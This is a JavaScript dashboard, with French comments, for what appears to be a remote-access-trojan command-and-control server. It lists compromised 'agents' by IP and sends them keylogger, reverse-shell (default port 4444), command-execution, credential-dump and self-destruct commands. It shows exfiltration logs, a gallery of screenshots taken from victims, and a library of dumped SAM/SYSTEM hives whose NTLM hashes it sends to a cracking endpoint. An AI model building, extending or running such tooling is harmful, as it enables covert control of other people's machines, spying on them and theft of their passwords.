const API_URL = 'http://localhost:8000';
let selectedClientId = null;
let selectedClientDestroyed = false;
let logInterval = null;
let clientsCache = []; // Cache des clients pour accéder aux données même après déconnexion

// Elements
const clientList = document.getElementById('client-list');
const refreshBtn = document.getElementById('refresh-clients');
const consoleOutput = document.getElementById('console-output');
const currentClientTitle = document.getElementById('current-client-title');
const commandInput = document.getElementById('command-input');
const sendBtn = document.getElementById('send-btn');
const selectedServiceLabel = document.getElementById('selected-service');

let selectedService = null;

// Functions
async function sendCommand(ip, command) {
    // Désactiver le bouton pendant l'envoi
    sendBtn.disabled = true;
    const originalContent = sendBtn.innerHTML;
    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending...</span>';
    
    try {
        const response = await fetch(`${API_URL}/clients/${ip}/send`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ command })
        });
        const data = await response.json();
        if (data.status === 'sent') {
            // Feedback visuel de succès
            sendBtn.innerHTML = '<i class="fas fa-check"></i> <span>Sent</span>';
            sendBtn.style.background = 'linear-gradient(135deg, #00cc33 0%, #00ff41 100%)';
            setTimeout(() => {
                sendBtn.innerHTML = originalContent;
                sendBtn.style.background = '';
            }, 1500);
            const currentInput = document.getElementById('command-input');
            if (currentInput) currentInput.value = '';
        } else {
            sendBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <span>Error</span>';
            sendBtn.style.background = '#ff4444';
            setTimeout(() => {
                sendBtn.innerHTML = originalContent;
                sendBtn.style.background = '';
                sendBtn.disabled = false;
            }, 2000);
            alert('Error: ' + (data.error || 'Failed to send command'));
        }
    } catch (error) {
        console.error('Error sending command:', error);
        sendBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> <span>Error</span>';
        sendBtn.style.background = '#ff4444';
        setTimeout(() => {
            sendBtn.innerHTML = originalContent;
            sendBtn.style.background = '';
            sendBtn.disabled = false;
        }, 2000);
    } finally {
        if (sendBtn.disabled && sendBtn.innerHTML.includes('Envoyé')) {
            sendBtn.disabled = false;
        }
    }
}

async function fetchClients() {
    try {
        const response = await fetch(`${API_URL}/clients`);
        const data = await response.json();
        clientsCache = data.clients; // Mettre à jour le cache
        renderClients(data.clients);
    } catch (error) {
        console.error('Error fetching clients:', error);
    }
}

function renderClients(clients) {
    clientList.innerHTML = '';
    if (clients.length === 0) {
        clientList.innerHTML = '<li style="cursor: default; opacity: 0.5;">No connected clients</li>';
        return;
    }

    clients.forEach(client => {
        const ip = client.ip || client; // Support backward compatibility
        const isActive = client.active !== undefined ? client.active : false;
        const isDestroyed = client.destroyed !== undefined ? client.destroyed : false;
        
        const li = document.createElement('li');
        li.dataset.id = ip;
        if (selectedClientId === ip) {
            li.classList.add('active');
            selectedClientDestroyed = isDestroyed; // Mettre à jour l'état du client sélectionné
        }
        if (isActive) li.classList.add('client-active');
        if (isDestroyed) li.classList.add('client-destroyed');
        
        // Créer l'indicateur de statut
        const statusIndicator = document.createElement('span');
        if (isDestroyed) {
            statusIndicator.className = 'status-indicator destroyed';
            statusIndicator.title = 'Agent destroyed';
        } else {
            statusIndicator.className = `status-indicator ${isActive ? 'active' : 'inactive'}`;
            statusIndicator.title = isActive ? 'Client connected (SSH active)' : 'Client disconnected (SSH inactive)';
        }
        
        // Créer le contenu du client
        const clientContent = document.createElement('div');
        clientContent.className = 'client-content';
        
        const ipSpan = document.createElement('span');
        ipSpan.className = 'client-ip';
        ipSpan.textContent = `IP: ${ip}`;
        
        const statusText = document.createElement('span');
        statusText.className = 'client-status-text';
        if (isDestroyed) {
            statusText.textContent = 'Destroyed';
            statusText.style.color = '#ff6b6b';
        } else {
            statusText.textContent = isActive ? 'Active' : 'Inactive';
            statusText.style.color = isActive ? 'var(--accent)' : '#ff4444';
        }
        
        clientContent.appendChild(statusIndicator);
        clientContent.appendChild(ipSpan);
        clientContent.appendChild(statusText);
        
        li.appendChild(clientContent);
        li.onclick = () => selectClient(ip);
        clientList.appendChild(li);
    });
    
    // Mettre à jour l'état du formulaire si un client est sélectionné
    if (selectedClientId) {
        // Utiliser le cache plutôt que la liste actuelle pour garantir la persistance du statut destroyed
        const selectedClient = clientsCache.find(c => (c.ip || c) === selectedClientId) || clients.find(c => (c.ip || c) === selectedClientId);
        if (selectedClient) {
            const wasDestroyed = selectedClientDestroyed;
            selectedClientDestroyed = selectedClient.destroyed !== undefined ? selectedClient.destroyed : false;
            
            // Si le statut destroyed a changé, mettre à jour le titre et le formulaire
            if (wasDestroyed !== selectedClientDestroyed) {
                currentClientTitle.textContent = `Client IP: ${selectedClientId}${selectedClientDestroyed ? ' (Destroyed)' : ''}`;
                updateFormState();
            } else {
                // Toujours mettre à jour le titre pour s'assurer qu'il est correct
                currentClientTitle.textContent = `Client IP: ${selectedClientId}${selectedClientDestroyed ? ' (Destroyed)' : ''}`;
                updateFormState();
            }
        }
    }
}

function selectClient(ip) {
    selectedClientId = ip;
    
    // Trouver le client dans le cache pour obtenir son état destroyed (plus fiable que le DOM)
    const clientData = clientsCache.find(c => (c.ip || c) === ip);
    selectedClientDestroyed = clientData ? (clientData.destroyed !== undefined ? clientData.destroyed : false) : false;
    
    // Update UI
    document.querySelectorAll('#client-list li').forEach(li => {
        li.classList.remove('active');
        if (li.dataset.id == ip) li.classList.add('active');
    });

    currentClientTitle.textContent = `Client IP: ${ip}${selectedClientDestroyed ? ' (Destroyed)' : ''}`;
    consoleOutput.innerHTML = '<p>Loading logs...</p>';

    // Désactiver/activer le formulaire selon l'état
    updateFormState();

    // Start fetching logs
    if (logInterval) clearInterval(logInterval);
    fetchLogs(ip);
    logInterval = setInterval(() => fetchLogs(ip), 2000); // Poll every 2 seconds
}

function updateFormState() {
    const sendBtn = document.getElementById('send-btn');
    const commandInput = document.getElementById('command-input');
    const selectedServiceLabel = document.getElementById('selected-service');
    const commandForm = document.getElementById('command-form');
    
    if (selectedClientDestroyed) {
        // Désactiver le formulaire
        if (sendBtn) sendBtn.disabled = true;
        if (commandInput) commandInput.disabled = true;
        if (selectedServiceLabel) selectedServiceLabel.style.opacity = '0.5';
        if (selectedServiceLabel) selectedServiceLabel.style.cursor = 'not-allowed';
        
        // Ajouter un message d'information (s'étend sur toute la largeur)
        let infoMsg = document.getElementById('destroyed-info-msg');
        if (!infoMsg) {
            infoMsg = document.createElement('div');
            infoMsg.id = 'destroyed-info-msg';
            infoMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> This agent has been destroyed. You can view history but cannot send commands.';
            if (commandForm) {
                commandForm.appendChild(infoMsg);
            }
        }
    } else {
        // Réactiver le formulaire
        if (sendBtn) sendBtn.disabled = false;
        if (commandInput) commandInput.disabled = false;
        if (selectedServiceLabel) selectedServiceLabel.style.opacity = '1';
        if (selectedServiceLabel) selectedServiceLabel.style.cursor = 'pointer';
        
        // Supprimer le message d'information
        const infoMsg = document.getElementById('destroyed-info-msg');
        if (infoMsg) infoMsg.remove();
    }
}

async function fetchLogs(ip) {
    try {
        const response = await fetch(`${API_URL}/clients/${ip}/logs`);
        const data = await response.json();
        
        if (data.logs !== undefined) {
            let logsText = data.logs;
            
            if (logsText.trim() === "") {
                consoleOutput.innerHTML = `<p class="empty-msg">Waiting for activity from ${ip}...</p>`;
            } else {
                // Décoder les \n encodés en vrais retours à la ligne pour l'affichage
                logsText = logsText.replace(/\\n/g, '\n').replace(/\\r/g, '\r');
                
                // Formater les lignes avec des couleurs pour les messages système
                const lines = logsText.split('\n');
                const formattedLines = lines.map(line => {
                    // Supprimer l'affichage des données binaires/exfil en base64 pour ne pas polluer la console
                    if (line.includes('EXFIL|') && line.length > 200) {
                        return '<span class="log-error">[HIDDEN DATA] Base64 exfiltration data hidden from console</span>';
                    }
                    if (line.length > 5000) {
                         return `<span class="log-error">[HIDDEN DATA] Large output (${line.length} chars) hidden from console</span>`;
                    }

                    if (line.includes('[CONNECTED]')) {
                        return `<span class="log-connected">${escapeHtml(line)}</span>`;
                    } else if (line.includes('[DISCONNECTED]')) {
                        return `<span class="log-disconnected">${escapeHtml(line)}</span>`;
                    } else if (line.startsWith('$ >')) {
                        return `<span class="log-command">${escapeHtml(line)}</span>`;
                    }
                    return escapeHtml(line);
                });
                
                consoleOutput.innerHTML = formattedLines.join('\n');
                // Scroll to bottom
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
            }
        } else if (data.error) {
            consoleOutput.innerHTML = `<span class="log-error">[System] ${escapeHtml(data.error)}</span>`;
        }
    } catch (error) {
        console.error('Error fetching logs:', error);
    }
}

// Fonction utilitaire pour échapper le HTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Event Listeners
refreshBtn.onclick = fetchClients;

// Sélection du service dans le menu
const dropdownWrapper = document.querySelector('.dropdown-wrapper');
const serviceText = selectedServiceLabel.querySelector('.service-text');
const dynamicInputContainer = document.getElementById('dynamic-input-container');

document.querySelectorAll('#service-dropdown a').forEach(link => {
    link.onclick = (e) => {
        e.preventDefault();
        selectedService = link.dataset.command;
        const serviceName = link.textContent.trim();
        serviceText.textContent = serviceName;
        dropdownWrapper.classList.remove('active');
        
        // Mise à jour dynamique de l'input selon le service
        updateInputForService(selectedService);
    };
});

function updateInputForService(service) {
    dynamicInputContainer.innerHTML = ''; // Clear container
    
    if (service === 'KEYLOG') {
        // Créer un select pour Keylog
        const select = document.createElement('select');
        select.id = 'command-input';
        select.className = 'command-select'; // Ajouter du style CSS si besoin
        
        const options = [
            { value: 'START', text: 'Start (START)' },
            { value: 'STOP', text: 'Stop (STOP)' },
            { value: 'DUMP', text: 'Get logs (DUMP)' }
        ];
        
        options.forEach(opt => {
            const option = document.createElement('option');
            option.value = opt.value;
            option.textContent = opt.text;
            select.appendChild(option);
        });
        
        dynamicInputContainer.appendChild(select);
        
    } else if (service === 'EXIT' || service === 'DESTROY') {
        // Pour EXIT et DESTROY, pas besoin d'input - créer un message informatif
        const infoDiv = document.createElement('div');
        infoDiv.className = 'command-info';
        infoDiv.style.padding = '10px';
        infoDiv.style.color = '#666';
        infoDiv.style.fontSize = '0.9em';
        if (service === 'DESTROY') {
            infoDiv.innerHTML = '<i class="fas fa-exclamation-triangle" style="color: #ff4444;"></i> This command will completely destroy the agent. No parameters required.';
        } else {
            infoDiv.innerHTML = '<i class="fas fa-info-circle"></i> This command will disconnect the agent. No parameters required.';
        }
        dynamicInputContainer.appendChild(infoDiv);
        // Créer un input caché pour la compatibilité avec handleSendCommand
        const hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.id = 'command-input';
        hiddenInput.value = '';
        dynamicInputContainer.appendChild(hiddenInput);
        
    } else {
        // Créer un input text standard pour les autres commandes
        const input = document.createElement('input');
        input.type = 'text';
        input.id = 'command-input';
        input.autocomplete = 'off';
        
        // Placeholder spécifique selon le service
        if (service === 'SHELL') {
            input.placeholder = 'Port (e.g. 4444)';
            input.value = '4444'; // Valeur par défaut
        } else if (service === 'CMD') {
            input.placeholder = 'Commande (ex: whoami)';
        } else if (service === 'CREDS') {
            input.placeholder = 'Chemin de dump (optionnel, ex: C:\\Temp\\Creds)';
        } else {
            input.placeholder = 'Entrez les paramètres...';
        }
        
        dynamicInputContainer.appendChild(input);
        
        // Réattacher l'event listener pour "Enter" sur le nouvel input
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !sendBtn.disabled) {
                handleSendCommand();
            }
        });
    }
}

// Fermer le dropdown en cliquant ailleurs
document.addEventListener('click', (e) => {
    if (!dropdownWrapper.contains(e.target)) {
        dropdownWrapper.classList.remove('active');
    }
});

// Toggle dropdown au clic sur le bouton service
selectedServiceLabel.onclick = (e) => {
    e.stopPropagation();
    dropdownWrapper.classList.toggle('active');
};

// Fonction pour envoyer la commande
function handleSendCommand() {
    if (!selectedClientId) {
        alert('Veuillez sélectionner un client d\'abord.');
        return;
    }
    if (selectedClientDestroyed) {
        alert('Cet agent a été détruit. Vous ne pouvez plus envoyer de commandes.');
        return;
    }
    if (!selectedService) {
        alert('Veuillez sélectionner un service dans le menu.');
        return;
    }

    // Récupérer l'élément input/select actuel dynamiquement
    const currentInput = document.getElementById('command-input');
    const params = currentInput ? currentInput.value.trim() : '';
    
    // Si c'est une commande SHELL, ouvrir le terminal avec le port spécifié
    if (selectedService === 'SHELL' && params) {
        const port = parseInt(params.split(' ')[0], 10);
        if (!isNaN(port)) {
            window.open(`terminal.html?port=${port}`, '_blank');
        }
    }
    
    // Si c'est EXIT ou DESTROY, demander confirmation
    if (selectedService === 'DESTROY') {
        if (!confirm('⚠️ ATTENTION: Cette commande détruira complètement l\'agent. L\'agent ne pourra plus se reconnecter automatiquement. Continuer ?')) {
            return;
        }
    } else if (selectedService === 'EXIT') {
        if (!confirm('Voulez-vous vraiment déconnecter l\'agent ?')) {
            return;
        }
    }
    
    // Si c'est KEYLOG, on envoie la commande complète (KEYLOG START, KEYLOG STOP, etc.)
    // Si c'est un input text, on concatène. Si c'est un select, params contient déjà la valeur (START/STOP/DUMP)
    let fullCommand;
    if (selectedService === 'KEYLOG') {
        // Pour KEYLOG, params est déjà l'action (START, STOP, DUMP) venant du select
        fullCommand = `${selectedService} ${params}`;
    } else if (selectedService === 'EXIT' || selectedService === 'DESTROY') {
        // EXIT et DESTROY n'ont pas besoin de paramètres
        fullCommand = selectedService;
    } else {
        fullCommand = params ? `${selectedService} ${params}` : selectedService;
    }
    
    sendCommand(selectedClientId, fullCommand);
}

// Envoi de l'instruction au clic sur le bouton
sendBtn.onclick = handleSendCommand;

// Envoi avec la touche Entrée
commandInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter' && !sendBtn.disabled) {
        handleSendCommand();
    }
});

// ==================== ALBUM SCREENSHOTS ====================

const albumBtn = document.getElementById('open-album');
const albumModal = document.getElementById('album-modal');
const imageModal = document.getElementById('image-modal');
const screenshotsGrid = document.getElementById('screenshots-grid');
const albumCount = document.getElementById('album-count');
const fullscreenImage = document.getElementById('fullscreen-image');
const imageTitle = document.getElementById('image-title');
const deleteBtn = document.getElementById('delete-screenshot');
const clearOutputBtn = document.getElementById('clear-output-btn');

let currentScreenshot = null;

// Ouvrir/fermer les modals
albumBtn.onclick = () => {
    fetchScreenshots();
    albumModal.classList.add('active');
};

document.querySelectorAll('.close-modal').forEach(btn => {
    btn.onclick = (e) => {
        e.target.closest('.modal').classList.remove('active');
    };
});

// Fermer modal en cliquant en dehors
document.querySelectorAll('.modal').forEach(modal => {
    modal.onclick = (e) => {
        if (e.target === modal) {
            modal.classList.remove('active');
        }
    };
});

// Récupérer les screenshots
async function fetchScreenshots() {
    try {
        const response = await fetch(`${API_URL}/screenshots`);
        const data = await response.json();
        
        albumCount.textContent = data.count || 0;
        
        if (data.screenshots && data.screenshots.length > 0) {
            renderScreenshots(data.screenshots);
        } else {
            screenshotsGrid.innerHTML = '<p class="empty-msg">Aucun screenshot disponible</p>';
        }
    } catch (error) {
        console.error('Erreur lors de la récupération des screenshots:', error);
        screenshotsGrid.innerHTML = '<p class="empty-msg">Erreur de chargement</p>';
    }
}

// Extraire l'IP du nom de fichier (screenshot_10_101_52_211_1768571810.bmp -> 10.101.52.211)
function extractIPFromFilename(filename) {
    // Format: screenshot_IP_TIMESTAMP.ext où IP a les . remplacés par _
    const match = filename.match(/screenshot_(\d+_\d+_\d+_\d+)_\d+/);
    if (match) {
        return match[1].replace(/_/g, '.');
    }
    return 'Unknown';
}

// Grouper les screenshots par IP
function groupScreenshotsByIP(screenshots) {
    const groups = {};
    
    screenshots.forEach(screenshot => {
        const ip = extractIPFromFilename(screenshot.filename);
        if (!groups[ip]) {
            groups[ip] = [];
        }
        groups[ip].push(screenshot);
    });
    
    return groups;
}

// Afficher les screenshots dans la grille, groupés par agent
function renderScreenshots(screenshots) {
    screenshotsGrid.innerHTML = '';
    
    const groupedScreenshots = groupScreenshotsByIP(screenshots);
    
    // Trier les IPs
    const sortedIPs = Object.keys(groupedScreenshots).sort();
    
    sortedIPs.forEach(ip => {
        // Créer un conteneur pour chaque agent
        const agentSection = document.createElement('div');
        agentSection.className = 'agent-section';
        
        // Header de l'agent
        const agentHeader = document.createElement('div');
        agentHeader.className = 'agent-header';
        agentHeader.innerHTML = `<i class="fas fa-desktop"></i> Agent: ${ip} <span class="screenshot-count">(${groupedScreenshots[ip].length})</span>`;
        agentSection.appendChild(agentHeader);
        
        // Grille des screenshots de cet agent
        const agentGrid = document.createElement('div');
        agentGrid.className = 'agent-screenshots-grid';
        
        groupedScreenshots[ip].forEach(screenshot => {
            const item = document.createElement('div');
            item.className = 'screenshot-item';
            
            const img = document.createElement('img');
            img.src = `${API_URL}/screenshots/${screenshot.filename}`;
            img.alt = screenshot.filename;
            img.loading = 'lazy';
            
            const info = document.createElement('div');
            info.className = 'screenshot-info';
            info.textContent = screenshot.filename;
            
            item.appendChild(img);
            item.appendChild(info);
            
            item.onclick = () => openFullscreen(screenshot.filename);
            
            agentGrid.appendChild(item);
        });
        
        agentSection.appendChild(agentGrid);
        screenshotsGrid.appendChild(agentSection);
    });
}

// Ouvrir en plein écran
function openFullscreen(filename) {
    currentScreenshot = filename;
    imageTitle.textContent = filename;
    fullscreenImage.src = `${API_URL}/screenshots/${filename}`;
    imageModal.classList.add('active');
}

// Supprimer un screenshot
deleteBtn.onclick = async () => {
    if (!currentScreenshot) return;
    
    if (confirm(`Supprimer ${currentScreenshot} ?`)) {
        try {
            const response = await fetch(`${API_URL}/screenshots/${currentScreenshot}`, {
                method: 'DELETE'
            });
            
            if (response.ok) {
                imageModal.classList.remove('active');
                fetchScreenshots();
            } else {
                alert('Erreur lors de la suppression');
            }
        } catch (error) {
            console.error('Erreur:', error);
            alert('Erreur lors de la suppression');
        }
    }
};

// Charger le compte au démarrage
async function updateAlbumCount() {
    try {
        const response = await fetch(`${API_URL}/screenshots`);
        const data = await response.json();
        albumCount.textContent = data.count || 0;
        
        // Afficher/masquer le bouton album selon s'il y a des screenshots
        if (data.count > 0) {
            albumBtn.style.display = 'flex';
        }
    } catch (error) {
        console.error('Erreur:', error);
    }
}

// ==================== BIBLIOTHÈQUE CREDENTIALS ====================

const credsBtn = document.getElementById('open-creds');
const credsModal = document.getElementById('creds-modal');
const credsDevicesListEl = document.getElementById('creds-devices-list');
const credsDatesListEl = document.getElementById('creds-dates-list');
const credsCoupleDetailEl = document.getElementById('creds-couple-detail');
const credsNavigatorListEl = document.getElementById('creds-navigator-list');

let credsCouplesCache = [];
/** Par device (IP) : liste des couples (SAM+SYSTEM + date). */
let credsByDevice = {};
let selectedCredsDeviceIp = null;

function extractIPFromCredFilename(filename) {
    const match = filename.match(/^(SYSTEM|SAM)_(\d+_\d+_\d+_\d+)_\d+\.hive$/i);
    if (match) return match[2].replace(/_/g, '.');
    return null;
}

function groupCredsByDevice(creds) {
    const groups = {};
    creds.forEach(file => {
        const ip = extractIPFromCredFilename(file.filename);
        if (ip) {
            if (!groups[ip]) groups[ip] = [];
            groups[ip].push(file);
        }
    });
    return groups;
}

function groupHashesByDevice(hashes) {
    const groups = {};
    (hashes || []).forEach(file => {
        const ip = file.device_ip && file.device_ip !== 'unknown' ? file.device_ip : null;
        if (ip) {
            if (!groups[ip]) groups[ip] = [];
            groups[ip].push(file);
        }
    });
    return groups;
}

function formatCredsDateTime(ts) {
    if (!ts) return '';
    const d = new Date(ts * 1000);
    return d.toLocaleString('fr-FR', { day: 'numeric', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
}

/** Extrait les lignes de hash SAM (user:rid:lmhash:nthash:::) du texte brut. Retourne HASHES = liste de strings. */
function parseHashLines(text) {
    if (!text || typeof text !== 'string') return [];
    const lines = text.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
    // Format SAM: username:rid:lmhash(32 hex):nthash(32 hex):::
    const re = /^[^:]+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::/;
    return lines.filter(line => re.test(line));
}

/** Vérifie l'état d'un hash (déjà cracké ou non) */
async function checkHashStatus(hash, pwdSpan, btn) {
    try {
        const res = await fetch(`${API_URL}/creds/check`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ hash: hash })
        });
        const data = await res.json().catch(() => ({}));
        
        if (data.is_cracked && data.password) {
            // Hash déjà cracké
            const username = data.username ? `${data.username}:` : '';
            pwdSpan.textContent = `→ ${username}${data.password}`;
            pwdSpan.style.color = '#4caf50';
            pwdSpan.style.fontWeight = 'bold';
            btn.textContent = 'Recasser';
            btn.style.backgroundColor = '#ff9800';
        } else {
            // Hash non cracké
            pwdSpan.textContent = '→ Non cracké';
            pwdSpan.style.color = '#757575';
            btn.textContent = 'Casser';
            btn.style.backgroundColor = '';
        }
    } catch (err) {
        console.error('Erreur vérification hash:', err);
        pwdSpan.textContent = '→ Erreur vérification';
        pwdSpan.style.color = '#f44336';
    }
}

/** Affiche le contenu hash : si lignes parsées, une case par hash ; sinon pre brut. */
function renderHashContent(containerEl, text) {
    if (!containerEl) return;
    containerEl.innerHTML = '';
    const hashes = parseHashLines(text);
    if (hashes.length > 0) {
        const list = document.createElement('div');
        list.className = 'creds-hash-list';
        hashes.forEach(h => {
            const line = document.createElement('div');
            line.className = 'creds-hash-line';
            const text = document.createElement('span');
            text.className = 'creds-hash-line-text';
            text.textContent = h;
            const pwdSpan = document.createElement('span');
            pwdSpan.className = 'creds-hash-password';
            pwdSpan.textContent = '→ Vérification...';
            pwdSpan.style.color = '#2196F3';
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.className = 'creds-hash-casser-btn';
            btn.textContent = 'Casser';
            btn.title = 'Casser le hash';
            
            // Vérifier automatiquement l'état au chargement
            checkHashStatus(h, pwdSpan, btn);
            btn.onclick = async () => {
                btn.disabled = true;
                const prev = btn.textContent;
                const prevPwdText = pwdSpan.textContent;
                const prevPwdColor = pwdSpan.style.color;
                const prevPwdWeight = pwdSpan.style.fontWeight;
                
                // Afficher "Cracking..." pendant le cassage
                btn.textContent = 'Cracking...';
                btn.style.backgroundColor = '#2196F3';
                pwdSpan.textContent = '→ Cassage en cours...';
                pwdSpan.style.color = '#2196F3';
                
                try {
                    const res = await fetch(`${API_URL}/creds/crack`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ hash: h })
                    });
                    let data = {};
                    try {
                        data = await res.json();
                    } catch (_) {
                        console.error('Erreur parsing JSON:', _);
                    }
                    
                    console.log('Résultat crack:', data);
                    
                    // Afficher les résultats selon le statut
                    if (data.password) {
                        // Hash cracké (déjà cracké ou vient d'être cracké)
                        const username = data.username ? `${data.username}:` : '';
                        pwdSpan.textContent = `→ ${username}${data.password}`;
                        pwdSpan.style.color = '#4caf50';
                        pwdSpan.style.fontWeight = 'bold';
                        btn.textContent = data.already_cracked ? 'Recasser' : 'Cracké ✓';
                        btn.style.backgroundColor = data.already_cracked ? '#ff9800' : '#4caf50';
                    } else if (data.status === 'not_cracked' || (!data.password && !data.already_cracked && !data.error)) {
                        // Hash non cracké après tentative
                        pwdSpan.textContent = '→ Non cracké (mot de passe non trouvé dans le dictionnaire)';
                        pwdSpan.style.color = '#ff9800';
                        btn.textContent = 'Non cracké';
                        btn.style.backgroundColor = '#ff9800';
                    } else if (data.error) {
                        // Erreur lors du crack
                        console.warn('Crack erreur:', data.error);
                        pwdSpan.textContent = `→ Erreur: ${data.error}`;
                        pwdSpan.style.color = '#f44336';
                        btn.textContent = 'Erreur';
                        btn.style.backgroundColor = '#f44336';
                    } else {
                        // Fallback: essayer d'extraire depuis data.cracked
                        let pwd = null;
                        if (data.cracked && typeof data.cracked === 'string') {
                            const lines = data.cracked.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
                            for (const line of lines) {
                                if (!line || line.includes('password hash cracked') || line.includes('left')) continue;
                                const parts = line.split(':');
                                // Format: username:password:RID:LM:NT:::
                                if (parts.length >= 2 && parts[1]) {
                                    pwd = parts[1];
                                    const username = parts[0] ? `${parts[0]}:` : '';
                                    pwdSpan.textContent = `→ ${username}${pwd}`;
                                    pwdSpan.style.color = '#4caf50';
                                    pwdSpan.style.fontWeight = 'bold';
                                    btn.textContent = 'Cracké ✓';
                                    btn.style.backgroundColor = '#4caf50';
                                    break;
                                }
                            }
                        }
                        if (!pwd) {
                            pwdSpan.textContent = '→ Résultat inconnu';
                            pwdSpan.style.color = '#757575';
                            btn.textContent = 'Inconnu';
                            btn.style.backgroundColor = '#757575';
                        }
                    }
                } catch (err) {
                    console.error('Crack request failed:', err);
                    pwdSpan.textContent = '→ Erreur réseau: ' + err.message;
                    pwdSpan.style.color = '#f44336';
                    btn.textContent = 'Erreur';
                    btn.style.backgroundColor = '#f44336';
                } finally {
                    // Réactiver le bouton après 3 secondes
                    setTimeout(() => {
                        btn.disabled = false;
                        if (btn.textContent === 'Cracking...') {
                            // Restaurer l'état précédent si le bouton était encore en "Cracking..."
                            btn.textContent = prev;
                            btn.style.backgroundColor = '';
                        }
                    }, 3000);
                }
            };
            line.appendChild(text);
            line.appendChild(pwdSpan);
            line.appendChild(btn);
            list.appendChild(line);
        });
        containerEl.appendChild(list);
    } else {
        const pre = document.createElement('pre');
        pre.className = 'creds-couple-hash-pre';
        pre.textContent = text || '';
        containerEl.appendChild(pre);
    }
}

/** Un couple = une IP avec SAM + SYSTEM. Plusieurs fichiers hash par device (un .txt par hash). */
function buildCouples(hiveFiles, hashFiles) {
    const byDeviceHives = groupCredsByDevice(hiveFiles);
    const byDeviceHashes = groupHashesByDevice(hashFiles);
    const couples = [];
    Object.keys(byDeviceHives).forEach(ip => {
        const hives = byDeviceHives[ip];
        const sam = hives.find(f => f.filename.toUpperCase().startsWith('SAM_'));
        const system = hives.find(f => f.filename.toUpperCase().startsWith('SYSTEM_'));
        if (sam && system) {
            const dateTs = Math.max(sam.created || 0, system.created || 0);
            const hashList = byDeviceHashes[ip] || [];
            couples.push({
                ip,
                samFile: sam,
                systemFile: system,
                date: dateTs,
                hashFiles: hashList
            });
        }
    });
    couples.sort((a, b) => (b.date || 0) - (a.date || 0));
    return couples;
}

async function fetchCreds() {
    try {
        const [credsRes, hashesRes] = await Promise.all([
            fetch(`${API_URL}/creds`),
            fetch(`${API_URL}/creds/hashes`)
        ]);
        const credsData = await credsRes.json();
        const hashesData = await hashesRes.json().catch(() => ({ hashes: [] }));
        const hiveFiles = credsData.creds || [];
        const hashFiles = hashesData.hashes || [];
        credsCouplesCache = buildCouples(hiveFiles, hashFiles);
        credsByDevice = {};
        credsCouplesCache.forEach(c => {
            if (!credsByDevice[c.ip]) credsByDevice[c.ip] = [];
            credsByDevice[c.ip].push(c);
        });
        Object.keys(credsByDevice).forEach(ip => {
            credsByDevice[ip].sort((a, b) => (b.date || 0) - (a.date || 0));
        });
        renderCredsDeviceList();
        credsDatesListEl.innerHTML = '<p class="empty-msg">Sélectionnez un device.</p>';
        credsCoupleDetailEl.innerHTML = '<p class="empty-msg">Sélectionnez un device puis une date à gauche.</p>';
        selectedCredsDeviceIp = null;
    } catch (error) {
        console.error('Erreur chargement creds:', error);
        credsDevicesListEl.innerHTML = '<p class="empty-msg">Erreur de chargement.</p>';
    }
}

/** Charge le contenu hash : filename (string) ou filenames (array). Si array, charge tous les fichiers et concatène. */
async function loadHashContent(areaEl, filenameOrList) {
    if (!areaEl) return;
    const filenames = Array.isArray(filenameOrList) ? filenameOrList : (filenameOrList ? [filenameOrList] : []);
    if (filenames.length === 0) return;
    areaEl.innerHTML = '<p class="creds-hash-loading">Chargement...</p>';
    try {
        const texts = await Promise.all(
            filenames.map(fn => fetch(`${API_URL}/creds/hashes/${encodeURIComponent(fn)}/content`).then(r => r.text()))
        );
        const combined = texts.join('\n').trim();
        renderHashContent(areaEl, combined);
    } catch (err) {
        areaEl.innerHTML = '';
        const pre = document.createElement('pre');
        pre.className = 'creds-couple-hash-pre';
        pre.textContent = 'Erreur: ' + err.message;
        areaEl.appendChild(pre);
    }
}

/** Colonne 1 : liste des devices (IP) — grosses catégories. Clic -> affiche les dates pour ce device. */
function renderCredsDeviceList() {
    credsDevicesListEl.innerHTML = '';
    const ips = Object.keys(credsByDevice).sort();
    if (ips.length === 0) {
        credsDevicesListEl.innerHTML = '<p class="empty-msg">Aucun device.</p>';
        return;
    }
    ips.forEach(ip => {
        const row = document.createElement('div');
        row.className = 'creds-device-category' + (selectedCredsDeviceIp === ip ? ' selected' : '');
        const count = credsByDevice[ip].length;
        row.innerHTML = `
            <span class="creds-device-ip">${ip}</span>
            <span class="creds-device-count">${count} dump${count > 1 ? 's' : ''}</span>
        `;
        row.onclick = () => {
            selectedCredsDeviceIp = ip;
            renderCredsDeviceList();
            renderCredsDatesList(ip);
            credsCoupleDetailEl.innerHTML = '<p class="empty-msg">Sélectionnez une date à gauche.</p>';
        };
        credsDevicesListEl.appendChild(row);
    });
}

/** Colonne 2 : liste des date/heure pour le device sélectionné. Clic -> affiche la carte du couple. */
function renderCredsDatesList(ip) {
    credsDatesListEl.innerHTML = '';
    if (!ip || !credsByDevice[ip]) {
        credsDatesListEl.innerHTML = '<p class="empty-msg">Sélectionnez un device.</p>';
        return;
    }
    const couples = credsByDevice[ip];
    couples.forEach(couple => {
        const row = document.createElement('div');
        row.className = 'creds-date-row';
        const dateTimeStr = formatCredsDateTime(couple.date);
        row.innerHTML = `<span class="creds-date-datetime">${dateTimeStr}</span>`;
        row.onclick = () => showCredsCoupleDetail(couple);
        credsDatesListEl.appendChild(row);
    });
}

/** Affiche la carte d’un couple dans le panneau de droite. */
function showCredsCoupleDetail(couple) {
    const dateTimeStr = formatCredsDateTime(couple.date);
    const hashFiles = couple.hashFiles || [];
    const hasHash = hashFiles.length > 0;
    const firstHashFile = hashFiles[0];
